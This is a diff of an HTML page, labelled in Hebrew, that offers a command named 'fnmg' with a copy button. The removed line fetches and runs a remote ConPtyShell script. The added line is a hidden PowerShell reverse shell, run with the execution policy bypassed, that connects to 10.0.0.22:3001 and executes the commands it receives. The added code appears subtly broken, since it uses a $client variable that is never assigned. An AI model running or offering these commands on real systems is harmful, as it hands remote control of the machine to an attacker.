@@ -12,7 +12,7 @@
     <div class="main">
     <h1>fnmg :פקודה</h1>
     <h2>:צורת כתיבה</h2>
-    <p id="text-to-copy">IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.22 3001
+    <p id="text-to-copy">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.22",3001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
     </p>
     <button id="btnCopy" onclick="copyText(document.querySelector('#text-to-copy'));">העתק</button>
     <h2>:דוגמא לתשובה</h2>
